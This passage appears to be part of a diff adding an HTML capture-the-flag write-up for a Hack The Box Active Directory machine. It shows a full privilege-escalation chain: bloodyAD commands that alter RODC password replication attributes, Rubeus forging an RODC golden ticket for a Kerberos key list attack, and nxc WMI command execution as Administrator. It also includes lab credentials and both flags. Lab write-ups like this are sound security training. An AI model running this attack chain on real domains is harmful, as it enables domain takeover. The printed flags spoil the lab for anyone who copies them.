+            the credentials of certain users are not cached. This is managed by the <span class="highlight">DENIED RODC PASSWORD REPLICATION GROUP</span> and 
+            <span class="highlight">ALLOWED RODC PASSWORD REPLICATION GROUP</span> groups, which control which users respectively cannot or must be cached by the Read Only 
+            Domain Controller.
+         </p>
+
+         <p>
+            These groups are managed inside the RODC via two attributes: <span class="highlight">msDS-NeverRevealGroup</span> and <span class="highlight">msDS-RevealOnDemandGroup</span>. 
+            To modify them we need a domain user with the <span class="highlight">RODC Administrator</span> role.
+         </p>
+
+         <img src="./images/Pasted image 20260424014334.png" width="1000rem">
+
+         <p>
+            Through Bloodhound I discover that <span class="highlight">l.wilson_adm</span>, being a member of the <span class="highlight">TIER 1</span> group, can add 
+            itself to the <span class="highlight">RODC Administrators</span> group to obtain these privileges.
+         </p>
+      </section>
+
+      <section id="privilege-escalation">
+         <h2>cat privilege-escalation</h2>
+
+         <p>Using the graphical interface I add the role to the user:</p>
+
+         <img src="./images/Pasted image 20260424014519.png" width="400rem">
+
+         <p>
+            I can now use the credentials of <span class="highlight">l.wilson_adm</span> to modify the <span class="highlight">msDS-NeverRevealGroup</span> and 
+            <span class="highlight">msDS-RevealOnDemandGroup</span> attributes with the goal of removing the <span class="highlight">ADMINISTRATORS</span> group 
+            from the non-cached list and adding it to the allowed list, effectively modifying the <span class="highlight">Password Replication Policy</span>.
+         </p>
+         
+         <h3>1. Clearing msDS-NeverRevealGroup</h3>
+
+         <div class="code">
+            python3 bloodyAD.py --host "DC01.garfield.htb" -d "garfield.hrb" -u "l.wilson_adm" -p "Password123!" set object 'RODC01$' msDS-NeverRevealGroup
+         </div>
+
+         <h3>2. Setting msDS-RevealOnDemandGroup</h3>
+
+         <div class="code">
+            python3 bloodyAD.py --host "DC01.garfield.htb" -d "garfield.hrb" -u "l.wilson_adm" -p "Password123!" set object 'RODC01$' msDS-RevealOnDemandGroup -v 'CN=ALLOWED RODC PASSWORD REPLICATION GROUP,CN=USERS,DC=GARFIELD,DC=HTB' -v 'CN=ADMINISTRATORS,CN=BUILTIN,DC=GARFIELD,DC=HTB'
+         </div>
+
+         <p>
+            Now that the <span class="highlight">Password Replication Policy</span> has been modified, we will use a technique known as 
+            <span class="highlight">Kerberos Key List Attack (golden ticket)</span> to obtain an <span class="highlight">Administrator</span> ticket on 
+            <span class="highlight">DC01</span>. This technique is documented at the following <a target="_blank" href="https://www.thehacker.recipes/ad/movement/credentials/dumping/kerberos-key-list#kerberos-key-list">resource</a>.
+         </p>
+         
+         <div class="code">
+            .\Rubeus.exe golden /rodcNumber:8245 /flags:forwardable,renewable,enc_pa_rep /nowrap /outfile:ticket.kirbi /aes256:d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240 /user:Administrator /id:500 /domain:garfield.htb /sid:S-1-5-21-2502726253-3859040611-225969357 <br>
+            <br>
+            mv .\ticket_2026_04_24_18_48_34_Administrator_to_krbtgt@GARFIELD.HTB.kirbi ticket.kirbi <br>
+            <br>
+            .\Rubeus.exe asktgs /enctype:aes256 /keyList /ticket:ticket.kirbi /service:krbtgt/garfield.htb
+         </div>
+
+         <p>
+            We can also export the ticket and convert it with the <span class="highlight">ticketConverter.py</span> tool to obtain a ccache for use from our 
+            attacker machine:
+         </p>
+         
+         <div class="code">
+            (venv) k0d14k@kpb:~/Documenti/garfield/privesc$ ticketConverter.py ticket.kirbi administrator_dc01.ccache <br>
+            Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies&nbsp;&nbsp;<br>
+            <br>
+            [*] converting kirbi to ccache... <br>
+            [+] done <br>
+            (venv) k0d14k@kpb:~/Documenti/garfield/privesc$ export KRB5CCNAME=administrator_dc01.ccache&nbsp;&nbsp;<br>
+            (venv) k0d14k@kpb:~/Documenti/garfield/privesc$ nxc ldap DC01.garfield.htb -k --use-kcache <br>
+            LDAP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DC01.garfield.htb 389&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:GARFIELD.HTB) (signing:None) (channel binding:No TLS cert)&nbsp;&nbsp;<br>
+            LDAP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DC01.garfield.htb 389&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [+] GARFIELD.HTB\Administrator from ccache (Pwn3d!) <br>
+            (venv) k0d14k@kpb:~/Documenti/garfield/privesc$ nxc wmi DC01.garfield.htb -k --use-kcache -x "whoami" <br>
+            RPC&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DC01.garfield.htb 135&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:garfield.htb) <br>
+            WMI&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DC01.garfield.htb 135&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [+] garfield.htb\Administrator from ccache (Pwn3d!) <br>
+            WMI&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DC01.garfield.htb 135&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [+] Executed command: "whoami" via wmiexec <br>
+            WMI&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DC01.garfield.htb 135&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; garfield\administrator
+         </div>
+
+         <p>
+            We can now retrieve the root flag from the <span class="highlight">root.txt</span> file on the administrator's desktop or extract NTLM hashes 
+            in order to gain full Domain Controller access:
+         </p>
+         
+         <div class="code">
+            (venv) k0d14k@kpb:~/Documenti/garfield/privesc$ nxc wmi DC01.garfield.htb -k --use-kcache -x "type C:\Users\Administrator\Desktop\root.txt" <br>
+            RPC&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DC01.garfield.htb 135&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:garfield.htb) <br>
+            WMI&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DC01.garfield.htb 135&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [+] garfield.htb\Administrator from ccache (Pwn3d!) <br>
+            WMI&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DC01.garfield.htb 135&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [+] Executed command: "type C:\Users\Administrator\Desktop\root.txt" via wmiexec <br>
+            WMI&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DC01.garfield.htb 135&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 4bf86310dc045fd62beb432dec66b135
+         </div>
+      </section>
+
+
+      <section id="flags">
+         <h2>cat flags</h2>
+         <h3><b>User Flag:</b> 0f9dcf1126c166d67dd312825aef249a</h3>
+         <h3><b>Root Flag:</b> 4bf86310dc045fd62beb432dec66b135</h3>
+      </section>
+    </main>
+
+
+   <footer>
+      <p>Built with GitHub Pages —— Securing the web, one bug at a time.</p>
+      <p>&copy; 2025 K0D14K</p>
+   </footer>
+
+   <script src="/static/script.js"></script>
+   <script> lister() </script>
+</body>
